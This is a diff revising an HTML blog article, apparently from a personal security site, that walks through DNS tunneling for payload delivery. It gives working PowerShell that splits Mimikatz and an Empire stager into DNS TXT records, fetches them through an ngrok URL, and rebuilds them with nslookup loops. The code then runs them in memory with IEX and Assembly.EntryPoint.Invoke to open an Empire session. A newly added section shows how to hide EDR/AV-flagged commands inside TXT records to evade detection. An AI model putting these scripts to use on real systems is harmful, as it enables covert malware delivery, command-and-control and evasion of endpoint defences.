@@ -62,43 +62,44 @@
                                 We have seen in a previous article (<a href="namedpipes.html">Named Pipes</a>) that it was possible to send and receive some data from a server to a client through a tunnel or a channel. Instead of using the Named Pipes, the well known protocol for Internet, DNS, will be used to transfer the data. <br>
                                 <br>
                                 <h4>Definition</h4>
-                                The domain name system is mainly used for identifying systems through Internet. Any system connected to Internet must have a IP address. But as human, it is complicated to remember all the different IP address and easier to remember a domain name such as "google.com". DNS will map the human-friendly domain name to the numerical IP address of the computer. <br>
-                                DNS has been created in the very early days of Internet and the DNS Tunneling attack method is not a recent discovery, it has been around for a very long time. Despite it is a old and well known technique, many organizations still have difficulties to detect and prevent it. Usually, adversaries use DNS Tunneling for data exfiltration but in some recent malicious activities, DNS Tunneling has been also used to beacon a Command & Control and execute commands or payload(Cobalt Strike).<br>
+                                The domain name system is mainly used for identifying systems through Internet. Any system connected to Internet must have an IP address. But as a human, remembering all the different IP addresses become very complicated and it is definitely easier to remember a domain name such as "google.com". DNS will map the human-friendly domain name to the numerical IP address. <br>
+                                DNS has been created in the early days of Internet and the DNS tunneling attack method is not a recent discovery, it has been around for a long time. Despite it is a old and well known technique, many organizations still have difficulties to detect and prevent it. Usually, adversaries use DNS tunneling for data exfiltration but in some recent malicious activities, the protocol DNS has been also used to beacon a Command & Control and execute some commands or payloads (Cobalt Strike).<br>
                                 <br>
                                 <h4>DNS records</h4>
-                                Every domain has its own resource records, which is a list of records type link to the domain. Each record has at least a type and a value. There are a few types of DNS records : A (IPv4), AAAA (IPv6), MX (domain name), NS (domain name) and TXT (string). If an adversary is looking for a way to extract data or to store potential malicious data, he might store it in the TXT record since it accept strings and is the DNS type records that can contain the most of characters. The string limit per TXT records is 255, which means that several TXT records will be necessary for the attacker to successfully perform the attack. We know that executable file is not only fully human readable characters, but in order to transform into a fully human readable character, the common encoding method is base64. Base64 is composed of characters ‘A-Z’, ‘a-z’, ‘0-9’, ‘+’, ‘=’, ‘/’. <br>
+                                Every domain has a resource record, which is a information entry in the DNS zone file. Each record has at least a type and a value. There are a few types of DNS records : A (IPv4), AAAA (IPv6), MX (domain name), NS (domain name) and TXT (string). If an adversary is looking for a way to extract data or to store potential malicious data, the TXT record seems to be the most appropriate since it accepts any string value and is the DNS type record that can contain the most of characters. The character limit per TXT record is 255, which means that several TXT records will be necessary for the attacker to successfully perform the attack if the length of the payload is more than 255. We know that executable file is not fully human readable characters so to transform into a fully human readable character, the common encoding method is base64. Base64 is composed of characters ‘A-Z’, ‘a-z’, ‘0-9’, ‘+’, ‘=’, ‘/’. <br>
                                 <br>
                                 <h4>Important notes</h4>
-                                Before storing the information in the TXT record of the DNS, some things have to be taken into account:
+                                Before storing the information in a TXT record, some things have to be taken into consideration:
                                 <ul>
-                                    <li>Not-in-order problem: There is no guarantee that the TXT record will be returned in order. Since that we need to recreate the executable from the base64, we need to make sure that it comes in order.</li>
-                                    <li>Duplicate result will not be display, only one result will be displayed. It is very common for a PowerShell script to have a lot of A when the hex is convert as a base64. Therefore, If there are several time 255 ‘A’, the TXT record will only show one 255 ‘A’.</li>
+                                    <li><strong>Not-in-order problem:</strong> There is no guarantee that the TXT record will be returned in order. Since that we need to recreate the executable from the base64, we need to make sure that it comes in order.</li>
+                                    <li><strong>Duplicate issue:</strong> Duplicate results will not be display, only one result will be displayed. It is very common for a PowerShell script to have a lot of A when the hex is convert as a base64. Therefore, If there are several times 255 ‘A’, the TXT record will only show one 255 ‘A’.</li>
                                 </ul>                                
-                                To avoid those issues, it is necessary to create subdomains and store 255 strings on the TXT records. <br>
+                                To avoid those issues, it is necessary to create subdomains with numbers to keep track of the order and store the 255 strings in the TXT records. <br>
                                 <br>
-                                <h4>POC</h4>
-                                I've created a Windows Server that host a DNS server for this test.
-                                <img src="img/dnstunneling/dnsserver.jpg" class="img-fluid" width="700">
+                                <h4>Proof of Concept</h4>
+                                I've created a Windows Server that hosts a DNS server for this POC.
+                                <img src="img/dnstunneling/dnsserver.jpg" class="img-fluid" width="800">
                                 Let's create manually some TXT records in the DNS.
-                                <img src="img/dnstunneling/dnsserverrecordadded.jpg" class="img-fluid" width="700">
-                                Nslookup is a network administration command-line to obtain some DNS information about a domain name. In the current DNS server, I have created some TXT records named 0, 1, 2, 3 because it is easier to call them in this way when we need to make a loop in our script to get those TXT records in the correct order.
+                                <img src="img/dnstunneling/dnsserverrecordadded.jpg" class="img-fluid" width="800">
+                                Nslookup is a network administration command-line to obtain some DNS information about a domain name. In the current DNS server, I have created some TXT records named 0, 1, 2, 3 so that it is easier to get the correct order when a loop is running to get those TXT records.
 
                                 <div class="squarebox">For($i=0; $i -lt $numberofdomain; $i++){nslookup -q=txt $i}[-1]</div>
 
                                 Since that the result of nslookup stores the value at the last position of a array, the "[-1]" is used to get the last value of an array.
-                                <img src="img/dnstunneling/nslookup_1.jpg" class="img-fluid" width="700">
+                                <img src="img/dnstunneling/nslookup_1.jpg" class="img-fluid" width="800">
                                 Looking at the output, some tabulation characters and double quotes have to be removed from the string.
                                 <div class="squarebox">$string.replace(“`t”, “”).replace(“`””,””)}</div>
                                 If we need to recreate a PE file, we must concatenate the data present in each subdomain, let's try to concatenate the value of those subdomains.
                                 <div class="squarebox">For($i=0; $i -lt $numberofdomain; $i++){$temp = (nslookup -q=txt $i”.persolab.info”)[-1]; $result = $result + $temp.replace(“`t”, “”).replace(“`””,””)};Write-Host($result);</div>
-                                <img src="img/dnstunneling/concatenate.jpg" class="img-fluid" width="700">
-
+                                <img src="img/dnstunneling/concatenate.jpg" class="img-fluid" width="900">
+                                Great, now we have the knowledge to reconstruct a payload from the TXT records. Let's try with a real payload. <br>
+                                <br>
                                 <h4>Exploit</h4>
-                                <h5 style="color: slategrey;">Mimikatz</h5>
-                                We have previously made some tests by adding some data manually in the DNS server, however if the payload contain more than 10 000 characters, it is better to automate this task. To add DNS record in PowerShell, it exists a method called "Add-DnsServerResourceRecord".
+                                <h4 style="color: slategrey;">Mimikatz</h4>
+                                We have previously made some tests by adding some data manually in the DNS server, however, if the payload contain more than 10 000 characters, it is better to automate this task. To add DNS record in PowerShell, it exists a method called "Add-DnsServerResourceRecord".
 
-                                <div class="squarebox">Add-DnsServerResourceRecord -DescriptiveText "This is a test" -Name Test -Txt -ZoneName persolab.info</div>
-                                Let's retrieve a payload from my own web application by calling a DownloadString("https://hakkyahud.github.io/password.html"). Before writing our script, we need to determine the amount of subdomain. To do so, let's divide the amount of characters by 254.
+                                <div class="squarebox">Add-DnsServerResourceRecord -DescriptiveText [VALUE] -Name [NAME] -Txt -ZoneName [DNSZONE]</div>
+                                Let's retrieve a payload from my own web application by calling a DownloadString("https://hakkyahud.github.io/password.html"). Before writing our script, we need to determine the amount of subdomains. To do so, let's divide the amount of characters by 254.
                                 <div class="squarebox">[math]::ceiling($payload.length/254)</div>
                                 Once the number of subdomain has been determined, <strong>let's script it :)</strong> <br>
                                 <div class="squarebox">
@@ -107,20 +108,20 @@
                                     $domainname = "persolab.info"; <br>
                                     for($i = 0; $i -lt $numberofsubdomain; $i++){<br>
                                     &emsp;try{ <br>
-                                    &emsp;&emsp;$substring = $payload.substring(254*$i,254); //take from 254*i and add 254 following characters <br>
+                                    &emsp;&emsp;$substring = $payload.substring(254*$i,254); <i style="color: green;">//take from 254*i and add 254 following characters</i> <br>
                                     &emsp;&emsp;Add-DnsServerResourceRecord -DescriptiveText $substring -Name $i -Txt -ZoneName $domainname; <br>
                                     &emsp;}<br>
                                     &emsp;catch [ArgumentOutOfRangeException]{ <br>
-                                    &emsp;&emsp;$substring = $payload.substring(254*i, $payload.length-(254*$i)); //To not go outside of the buffer <br>
+                                    &emsp;&emsp;$substring = $payload.substring(254*i, $payload.length-(254*$i)); <i style="color: green;"> //To not write outside of the buffer</i> <br>
                                     &emsp;&emsp;Add-DnsServerResourceRecord -DescriptiveText $substring -Name $i -Txt -ZoneName $domainname; <br>
                                     &emsp;} <br>
                                     }
                                 </div>
-                                It works perfectly, there are so many subdomains that I cannot tell you how many is stored in the DNS server at the moment.
-                                <img src="img/dnstunneling/dnskatzpayload.jpg" class="img-fluid" width="700">
+                                Many TXT records have been created and I cannot tell you how many is stored in the DNS server at the moment.
+                                <img src="img/dnstunneling/dnskatzpayload.jpg" class="img-fluid" width="600">
                                 Let's make some calculation
                                 <img src="img/dnstunneling/payloadlenght.jpg" class="img-fluid" width="700">
-                                In this current payload, there are 4 839 426 characters and by dividing by 254, the DNS server have created 19053 subdomains. <br>
+                                In this current payload, there are 4 839 426 characters and by dividing by 254, the DNS server have created 19053 subdomains. Let's reconstruct the payload and attempt to run in our compromised system. The payload will be stored and executed in memory.<br>
                                 <div class="squarebox">
                                     $numberofsubdomain = 19053; <br>
                                     For($i=0; $i -lt $numberofdomain; $i++){ <br>
@@ -132,7 +133,7 @@
                                     $assembly.EntryPoint.Invoke($null, $null);
                                 </div>
 
-                                Since that we have 19053 subdomains, the loop goes from 0 to (19053-1) and I counted that the time to receive the DNS response from the DNS server takes around 3 seconds. With the 19053 subdomains that we have, if we are multiplying by 3, it is around 57159 seconds and by dividing by 3600 it becomes 16 hours to recreate the payload... <br>
+                                Since that we have 19053 subdomains, the loop goes from 0 to 19052 and the time that the client sends a DNS query and the DNS server returns an answer takes around 3 seconds. With the 19053 subdomains, if we are multiplying by 3, it is around 57159 seconds and by dividing by 3600 it becomes 16 hours to recreate the payload... <br>
 
                                 <br>
                                 After running the program 3 hours, I've stopped it and decided to find another payload. I was thinking a stager to connect to a <strong>Meterpreter</strong> session or <strong>Empire</strong> session. <br>
@@ -151,7 +152,7 @@
                                     }                                     
                                 </div>
                                 <br>                
-                                <h5 style="color: slategrey;">Empire</h5>
+                                <h4 style="color: slategrey;">Empire</h4>
                                 <h7 style="color: slategrey;">Create Listener</h7> <br>
                                 <ul>
                                     <li>uselisteners http </li>
@@ -160,7 +161,7 @@
                                     <li>set Name c2http</li>
                                     <li>execute</li>
                                 </ul>
-                                <img src="img/dnstunneling/empirelistener.jpg" class="img-fluid" width="700">
+                                <img src="img/dnstunneling/empirelistener.jpg" class="img-fluid" width="800">
                                 <h7 style="color: slategrey;">Create Stager</h7> <br>
                                 <ul>
                                     <li>usestager multi/launcher</li>
@@ -168,7 +169,7 @@
                                     <li>execute</li>
                                 </ul>
                                 <img src="img/dnstunneling/empirestager.jpg" class="img-fluid" width="700">
-                                Empire generates the PowerShell payload to run on the victim machine to open a remote Empire session. <br>
+                                Empire generates the PowerShell payload to run on the compromised system to open a remote Empire session. <br>
                                 <br>
                                 <h7 style="color: slategrey;">Setup web application</h7> <br>
                                 Copy this payload to a index.html file and create a python web application on a port in the index.html directory. <br>
@@ -183,7 +184,7 @@
                                 <strong>ngrok config add-authtoken [AUTHTOKEN XXX]</strong> <br>
                                 The authtoken saved to configuration file: /root/.config/ngrok/ngrok.yml
                                 <img src="img/dnstunneling/ngrok.jpg" class="img-fluid" width="700">
-                                Now the content of the index.html file can be reachable in Internet. Now we can add the payload in our DNS server.
+                                The content of the index.html file is reachable in Internet. We can add the payload in our DNS server.
 
                                 <div class="squarebox">
                                     $payload = (New-Object Net.WebClient).DownloadString("http://2de8-37-168-9-51.eu.ngrok.io"); <br>
@@ -203,14 +204,32 @@
                                 </div>
 
                                 <img src="img/dnstunneling/empirepayload.jpg" class="img-fluid" width="700">
-                                All the PowerShell payload that was in my web application has been put in the DNS server. The payload is divided in 15 subdomains. The last step is to  reconstruct the payload and run in a system. After running the payload on a Windows machine, it should open an Empire session on our attacker system.
+                                All the PowerShell payload stored in my web application has been put in the DNS server. The payload is divided in 15 TXT records. The last steps are to reconstruct the payload and run in a system. After running the payload on a Windows machine, an Empire session should be opened on our attacker system.
                                 <div class="squarebox">
                                     $numberofsubdomain = 15;$result = "";For($i=0; $i -lt $numberofsubdomain; $i++){$temp = (nslookup -q=txt $i”.persolab.info”)[-1];$result = $result + $temp.replace(“`t”, “”).replace(“`””,””);}$result = $result.replace("`"","");Write-Host($result);IEX($result);
                                 </div>
                                 <img src="img/dnstunneling/runpayload.jpg" class="img-fluid" width="900">
                                 <img src="img/dnstunneling/empireagent.jpg" class="img-fluid" width="900">
 
-                                Empire session is opened ! We have reconstruct the payload from the 15 subdomains of our DNS. Everything has been done in local, but an attack could have gotten a new domain to perform such a attack. By doing such a activity, it is very noisy in the network, the victim computer is requesting a lot of subdomains and the data size is quite huge.
+                                The Empire session is opened ! We have reconstruct the payload from the 15 TXT records of our DNS server. Everything has been done in local, but this attack could have been done from a new domain hosted by Google or Microsoft. This attack method generate quite a lot of DNS traffics since the compromised computer is requesting a lot of subdomains and the data size is quite huge. It shouldn't be too complicated to create a detection rule to be alerted when this case happen. However, many companies forget to monitor closely the DNS traffic because it is originally very noisy.
+                                <br><br>
+
+                                <h4>A little bit more stealthier</h4>
+                                The commands such as Invoke-Expression, Invoke-WebRequest, [System.Reflection.Assembly]::Loads, EntryPoint.Invoke are usually flagged by EDR or AV in case it is seen in the command line. A way to bypass those detections is to store those commands in a TXT record and call them with PowerShell.
+                                <div class="squarebox">Powershell .(nslookup -q=TXT [DOMAIN_NAME])[-1]</div>
+                                <img src="img/dnstunneling/psnslookup.jpg" class="img-fluid" width="700">
+
+                                In Powershell, there is another way to send a DNS query to a DNS server using the following command line.
+                                <div class="squarebox">Resolve-DnsName [DOMAIN_NAME] -type TXT</div>
+
+                                <img src="img/dnstunneling/resolvedns.jpg" class="img-fluid" width="800">
+                                If we just want the Strings object in this array, we can loop through the array and extract the Strings object.
+                                <div class="squarebox">powershell .(Resolve-DnsName [DOMAIN_NAME] -type TXT | foreach{$_.Strings})</div>
+                                <img src="img/dnstunneling/resolvedns3.jpg" class="img-fluid" width="800">
+
+                                In this test, we have tried with simple commands "ping 8.8.8.8" or "net user" but we can replace them with a command that sounds more malicious and might be detected by a host-based security system such as <strong>[System.Reflection.Assembly]::Loads()</strong>.
+
+
                             </p>
                     </div>
                 </div>
